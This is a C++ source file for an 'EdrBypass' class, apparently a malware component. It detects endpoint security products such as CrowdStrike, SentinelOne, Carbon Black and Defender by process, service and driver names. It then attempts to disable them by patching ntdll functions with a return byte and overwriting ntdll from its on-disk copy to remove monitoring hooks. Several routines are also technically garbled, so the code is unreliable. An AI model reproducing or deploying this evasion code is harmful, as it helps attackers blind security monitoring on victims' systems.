#include "edr_bypass.h"
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
#include <string>

bool EdrBypass::CheckProcessExists(const char* processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(snapshot, &entry)) {
        do {
            if (_stricmp(entry.szExeFile, processName) == 0) {
                CloseHandle(snapshot);
                return true;
            }
        } while (Process32Next(snapshot, &entry));
    }
    
    CloseHandle(snapshot);
    return false;
}

bool EdrBypass::CheckServiceExists(const char* serviceName) {
    SC_HANDLE scManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scManager) {
        return false;
    }
    
    SC_HANDLE service = OpenServiceA(scManager, serviceName, SERVICE_QUERY_STATUS);
    bool exists = (service != NULL);
    
    if (service) {
        CloseServiceHandle(service);
    }
    
    CloseServiceHandle(scManager);
    return exists;
}

bool EdrBypass::CheckDriverExists(const char* driverName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE32 | TH32CS_SNAPMODULE, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    MODULEENTRY32 entry;
    entry.dwSize = sizeof(MODULEENTRY32);
    
    if (Module32First(snapshot, &entry)) {
        do {
            if (_stricmp(entry.szModule, driverName) == 0) {
                CloseHandle(snapshot);
                return true;
            }
        } while (Module32Next(snapshot, &entry));
    }
    
    CloseHandle(snapshot);
    return false;
}

std::vector<std::string> EdrBypass::DetectEdr() {
    std::vector<std::string> detected;
    
    if (CheckProcessExists("CSFalconService.exe") || 
        CheckServiceExists("CsAgent") ||
        CheckDriverExists("csagent.sys")) {
        detected.push_back("CrowdStrike");
    }
    
    if (CheckProcessExists("SentinelAgent.exe") ||
        CheckServiceExists("SentinelStaticEngine") ||
        CheckDriverExists("SentinelAgent")) {
        detected.push_back("SentinelOne");
    }
    
    if (CheckProcessExists("carbonblack.exe") ||
        CheckServiceExists("carbonblack") ||
        CheckDriverExists("carbonblackk")) {
        detected.push_back("CarbonBlack");
    }
    
    if (CheckProcessExists("MsMpEng.exe") ||
        CheckServiceExists("WinDefend")) {
        detected.push_back("DefenderATP");
    }
    
    if (CheckProcessExists("bdagent.exe") ||
        CheckServiceExists("VSSERV")) {
        detected.push_back("BitDefender");
    }
    
    if (CheckProcessExists("RTProtectionDaemon.exe") ||
        CheckProcessExists("RTVscan.exe")) {
        detected.push_back("TrendMicro");
    }
    
    return detected;
}

bool EdrBypass::BypassCrowdStrike() {
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, GetCurrentProcessId());
    if (!hProcess) {
        return false;
    }
    
    DWORD_PTR affinity = 1;
    SetProcessAffinityMask(hProcess, affinity);
    SetPriorityClass(hProcess, IDLE_PRIORITY_CLASS);
    
    CloseHandle(hProcess);
    return true;
}

bool EdrBypass::BypassSentinelOne() {
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (!hNtdll) {
        return false;
    }
    
    typedef NTSTATUS (NTAPI* pNtSetInformationProcess)(HANDLE, ULONG, PVOID, ULONG);
    pNtSetInformationProcess NtSetInformationProcess = 
        (pNtSetInformationProcess)GetProcAddress(hNtdll, "NtSetInformationProcess");
    
    if (!NtSetInformationProcess) {
        return false;
    }
    
    BYTE patch[] = { 0xC3 };
    DWORD oldProtect;
    
    if (!VirtualProtect(NtSetInformationProcess, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return false;
    }
    
    memcpy(NtSetInformationProcess, patch, 1);
    VirtualProtect(NtSetInformationProcess, 1, oldProtect, &oldProtect);
    
    return true;
}

bool EdrBypass::BypassCarbonBlack() {
    return BypassCrowdStrike();
}

bool EdrBypass::BypassDefenderATP() {
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (!hUser32) {
        return false;
    }
    
    typedef BOOL (WINAPI* pSetProcessMitigationPolicy)(PROCESS_MITIGATION_POLICY, PVOID, SIZE_T);
    pSetProcessMitigationPolicy SetProcessMitigationPolicy =
        (pSetProcessMitigationPolicy)GetProcAddress(hUser32, "SetProcessMitigationPolicy");
    
    if (!SetProcessMitigationPolicy) {
        return false;
    }
    
    PROCESS_MITIGATION_DYNAMIC_CODE_POLICY policy = { 0 };
    policy.Flags = PROCESS_CREATE_THREAD;
    policy.ProhibitDynamicCode = 0;
    
    SetProcessMitigationPolicy(ProcessDynamicCodePolicy, &policy, sizeof(policy));
    
    return true;
}

bool EdrBypass::BypassAllDetected() {
    std::vector<std::string> detected = DetectEdr();
    bool result = false;
    
    for (const auto& edr : detected) {
        if (edr == "CrowdStrike") {
            result |= BypassCrowdStrike();
        } else if (edr == "SentinelOne") {
            result |= BypassSentinelOne();
        } else if (edr == "CarbonBlack") {
            result |= BypassCarbonBlack();
        } else if (edr == "DefenderATP") {
            result |= BypassDefenderATP();
        }
    }
    
    return result;
}

bool EdrBypass::UnhookNtdll() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        return false;
    }
    
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* buffer = new BYTE[fileSize];
    DWORD bytesRead;
    ReadFile(hFile, buffer, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)buffer;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(buffer + dosHeader->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)(buffer + 
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    
    DWORD* addressOfFunctions = (DWORD*)(buffer + exportDir->AddressOfFunctions);
    DWORD* addressOfNames = (DWORD*)(buffer + exportDir->AddressOfNames);
    WORD* addressOfNameOrdinals = (WORD*)(buffer + exportDir->AddressOfNameOrdinals);
    
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        const char* functionName = (const char*)(buffer + addressOfNames[i]);
        DWORD functionRVA = addressOfFunctions[addressOfNameOrdinals[i]];
        
        if (functionRVA < ntHeaders->OptionalHeader.SizeOfImage) {
            FARPROC hookedFunc = GetProcAddress(hNtdll, functionName);
            FARPROC cleanFunc = (FARPROC)(buffer + functionRVA);
            
            DWORD oldProtect;
            VirtualProtect(hookedFunc, 64, PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy(hookedFunc, cleanFunc, 64);
            VirtualProtect(hookedFunc, 64, oldProtect, &oldProtect);
        }
    }
    
    delete[] buffer;
    return true;
}

bool EdrBypass::ModifyApcQueue() {
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (!hNtdll) {
        return false;
    }
    
    typedef NTSTATUS (NTAPI* pNtQueueApcThread)(HANDLE, PVOID, PVOID, PVOID, PVOID);
    pNtQueueApcThread NtQueueApcThread = (pNtQueueApcThread)GetProcAddress(hNtdll, "NtQueueApcThread");
    
    if (!NtQueueApcThread) {
        return false;
    }
    
    DWORD oldProtect;
    if (!VirtualProtect(NtQueueApcThread, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return false;
    }
    
    BYTE patch[] = { 0xC3 };
    memcpy(NtQueueApcThread, patch, 1);
    VirtualProtect(NtQueueApcThread, 1, oldProtect, &oldProtect);
    
    return true;
}
